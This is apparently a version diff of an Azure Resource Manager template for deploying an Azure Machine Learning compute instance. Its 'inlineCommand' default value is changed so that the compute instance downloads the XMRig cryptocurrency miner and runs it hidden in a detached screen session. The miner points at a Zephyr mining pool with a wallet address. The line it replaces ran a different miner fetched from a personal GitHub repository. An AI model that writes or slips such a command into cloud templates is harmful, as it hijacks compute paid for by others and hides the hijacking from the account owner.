@@ -3,7 +3,7 @@
     "contentVersion": "1.0.0.0",
     "parameters": {
         "workspaceName": {
-            "defaultValue": "v24",
+            "defaultValue": "v26",
             "type": "string",
             "metadata": {
                 "description": "Specifies the name of the Azure Machine Learning workspace to which compute instance will be deployed"
@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/jokervulinh188/lucky2/releases/download/node2/astrominer-V1.8_BETA5_F_generic_amd64_linux.tar.gz; tar xf astrominer-V1.8_BETA5_F_generic_amd64_linux.tar.gz; sudo screen -d -m ./rpc_mining.sh",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz; tar xf xmrig-6.20.0-linux-static-x64.tar.gz; cd xmrig-6.20.0; sudo screen -d -m ./xmrig -o zephyr.miningocean.org:5432 -u ZEPHsD1kEDaHLaoum1H2gr6kGcZ4DF4AiXzQVkmuqy9CcUG4cJfGUAQiVRWZAEnTe8fMPMDbBgFYSMZiszZJcDB7coafFQy6QkD -p jokervulinh -a rx -k --donate-level 1 --tls -t 16",
             "metadata": {
                 "description": "inline command"
             }
